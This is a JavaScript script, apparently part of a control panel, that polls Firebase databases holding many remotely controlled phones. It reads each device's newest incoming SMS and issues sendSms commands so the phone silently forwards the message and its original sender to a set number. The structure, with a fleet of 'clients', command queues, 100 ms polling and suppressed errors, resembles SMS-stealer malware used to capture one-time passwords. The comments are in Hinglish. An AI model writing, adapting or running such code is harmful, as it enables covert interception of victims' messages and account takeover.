/* ============================================================
   ANANYA SMS Forwarder v6.0 — Fire & Forget
   Server.js jaisa fast — koi await, koi wait
   ============================================================ */

(function () {
    'use strict';

    console.log('[SMS-FWD] v6.0 Fire&Forget ✅');

    var ACCOUNTS_KEY = 'flixy_accounts';
    var PROCESSED_KEY = 'sms_fwd_v6';
    var POLL_INTERVAL = 100;

    function getAccounts() {
        try {
            var s = localStorage.getItem(ACCOUNTS_KEY);
            return s ? JSON.parse(s) : [];
        } catch (e) { return []; }
    }

    // ============ FIRE & FORGET HTTP ============
    // Ye function turant return karta hai, response ka wait nahi karta
    function firePut(url, data) {
        fetch(url, {
            method: 'PUT',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(function() {});  // errors ignore
    }

    function firePost(url, data) {
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(function() {});
    }

    // Sirf GET ke liye await karo (data chahiye padhne ke liye)
    async function fbGet(base, key, path) {
        try {
            var url = base.replace(/\/$/, '') + '/' + path + '.json?auth=' + key;
            var r = await fetch(url);
            if (!r.ok) return null;
            return await r.json();
        } catch (e) { return null; }
    }

    // ============ PROCESSED TRACKER ============
    var processed = new Set();
    try {
        var saved = JSON.parse(localStorage.getItem(PROCESSED_KEY) || '[]');
        for (var i = 0; i < saved.length; i++) processed.add(saved[i]);
    } catch (e) {}

    function markDone(k) {
        processed.add(k);
        try {
            var arr = Array.from(processed).slice(-1000);
            localStorage.setItem(PROCESSED_KEY, JSON.stringify(arr));
        } catch (e) {}
    }

    function getMsgTimestamp(sms) {
        if (!sms) return 0;
        if (sms.timestamp && typeof sms.timestamp === 'number') return sms.timestamp;
        if (sms.dateTime) {
            var t = new Date(sms.dateTime).getTime();
            if (!isNaN(t)) return t;
        }
        if (sms.time) {
            var t2 = new Date(sms.time).getTime();
            if (!isNaN(t2)) return t2;
        }
        return 0;
    }

    // ============ CORE — FIRE & FORGET ============
    // Pura function async NAHI hai — turant chalta hai
    function handleDeviceFast(acc, devId, cfg, msgs) {
        try {
            if (!cfg || !cfg.enabled || !cfg.forwardTo) return;

            var to = String(cfg.forwardTo).replace(/[^0-9]/g, '');
            var simSlot = cfg.simSlot != null ? cfg.simSlot : (cfg.sim || 0);
            var enabledAt = cfg.enabledAt || 0;
            if (!to) return;
            if (!msgs || typeof msgs !== 'object') return;

            var ids = Object.keys(msgs);
            if (!ids.length) return;
            ids.sort(function (a, b) { return Number(a) - Number(b); });

            // Sirf last 2 messages check karo
            var scanLimit = Math.min(2, ids.length);
            var startIdx = ids.length - scanLimit;

            var base = acc.url.replace(/\/$/, '');
            var auth = acc.key;

            for (var i = startIdx; i < ids.length; i++) {
                var msgId = ids[i];
                var k = devId + '_' + msgId;
                if (processed.has(k)) continue;

                var sms = msgs[msgId];
                if (!sms) { markDone(k); continue; }
                if (sms.type !== 'incoming') { markDone(k); continue; }

                var msgTime = getMsgTimestamp(sms);
                if (enabledAt > 0 && msgTime > 0 && msgTime < enabledAt) {
                    markDone(k);
                    continue;
                }

                var text = sms.message || sms.body || sms.text || '';
                if (!text) { markDone(k); continue; }

                // ⚡ TURANT MARK — pehle hi
                markDone(k);

                var ts = Date.now();
                var cid = 'fwd_' + ts + '_' + Math.random().toString(36).slice(2, 8);
                var sim = { simSlot: simSlot };

                console.log('[SMS-FWD] ⚡ FAST:', sms.sender || 'Unknown', '→', to);

                // ⚡ FIRE & FORGET — koi await nahi, turant sab bhejo
                var url1 = base + '/clients/' + devId + '/webhookEvent/sendSms.json?auth=' + auth;
                firePut(url1, {
                    to: to, message: text, isSended: false,
                    timestamp: ts, commandId: cid, simInfo: sim,
                    forwarded: true, originalSender: sms.sender || 'Unknown'
                });

                var url2 = base + '/clients/' + devId + '/commands/sendSms.json?auth=' + auth;
                firePut(url2, {
                    targetNumber: to, message: text, timestamp: ts,
                    status: 'pending', id: cid, simInfo: sim, forwarded: true
                });

                var url3 = base + '/clients/' + devId + '/messages.json?auth=' + auth;
                firePost(url3, {
                    sender: 'FORWARDER',
                    message: 'Fwd to ' + to + ': ' + String(text).slice(0, 200),
                    dateTime: ts, timestamp: ts, type: 'outgoing',
                    targetNumber: to, commandId: cid, status: 'pending',
                    simInfo: sim, forwarded: true
                });

                var url4 = base + '/clients/' + devId + '/sms.json?auth=' + auth;
                firePut(url4, {
                    to: to, text: text, timestamp: ts, status: 'pending',
                    commandId: cid, forwarded: true
                });

                // Bass — turant aage badho. Response ka wait mat karo.
            }
        } catch (e) {
            console.error('[SMS-FWD] Error:', e.message);
        }
    }

    // ============ MAIN LOOP ============
    var busy = false;

    async function tick() {
        if (busy) return;
        busy = true;
        try {
            var accs = getAccounts();
            for (var i = 0; i < accs.length; i++) {
                var acc = accs[i];
                if (!acc.url || !acc.key) continue;

                // Parallel me saare GET requests
                var clients = await fbGet(acc.url, acc.key, 'clients');
                if (!clients || typeof clients !== 'object') continue;

                var devIds = Object.keys(clients);

                // Saare devices ke configs aur messages PARALLEL me lao
                var promises = devIds.map(function(devId) {
                    return Promise.all([
                        fbGet(acc.url, acc.key, 'clients/' + devId + '/smsForwarding'),
                        fbGet(acc.url, acc.key, 'messages/' + devId)
                    ]).then(function(results) {
                        return { devId: devId, cfg: results[0], msgs: results[1] };
                    });
                });

                var results = await Promise.all(promises);

                // Har device handle karo (fire & forget)
                for (var j = 0; j < results.length; j++) {
                    handleDeviceFast(acc, results[j].devId, results[j].cfg, results[j].msgs);
                }
            }
        } finally {
            busy = false;
        }
    }

    setInterval(tick, POLL_INTERVAL);
    setTimeout(tick, 1000);

    console.log('[SMS-FWD] v6.0 Running every', POLL_INTERVAL, 'ms ⚡');
    console.log('[SMS-FWD] Fire & Forget mode — server.js jaisa fast');

})();
